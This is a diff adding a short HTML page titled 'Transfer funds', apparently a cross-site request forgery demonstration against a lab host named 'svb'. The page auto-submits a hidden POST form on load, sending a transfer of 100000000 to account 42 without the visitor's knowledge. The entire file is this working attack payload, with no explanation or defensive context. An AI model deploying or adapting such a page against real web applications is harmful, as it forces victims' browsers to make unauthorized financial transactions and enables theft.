@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Transfer funds</title>
+  </head>
+  <body onload="document.myForm.submit()">
+    <h1>Transfer funds</h1>
+    <form method="POST" action="http://svb:5003/transfer/1">
+      <input type="text" name="account" value="42" /><br />
+      <input type="text" name="amount" value="100000000" /><br />
+    </form>
+  </body>
+</html>
